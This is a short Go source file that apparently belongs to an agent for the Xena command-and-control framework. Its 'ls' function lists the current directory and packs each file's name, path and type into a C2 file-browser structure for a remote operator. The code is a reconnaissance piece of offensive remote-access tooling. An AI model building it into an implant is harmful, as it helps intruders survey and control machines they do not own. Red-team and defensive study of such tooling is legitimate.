package interpreter

import (
	"os"
	"path/filepath"

	c2api "github.com/zarkones/xena-client"
)

var wd = func() string {
	dir, err := os.Getwd()
	if err != nil {
		homeDir, _ := os.UserHomeDir()
		return homeDir
	}
	return dir
}()

func ls() (fbCtx c2api.FileBrowserCtx) {
	records, err := os.ReadDir(wd)
	if err != nil {
		fbCtx.Err = err.Error()
		return fbCtx
	}

	fbCtx.WorkingDir = wd

	fbCtx.Records = make([]c2api.FileRecord, len(records))
	for i, record := range records {
		fbCtx.Records[i] = c2api.FileRecord{
			Name:         record.Name(),
			AbsolutePath: filepath.Join(wd, record.Name()),
			IsDir:        record.IsDir(),
		}
	}

	return fbCtx
}
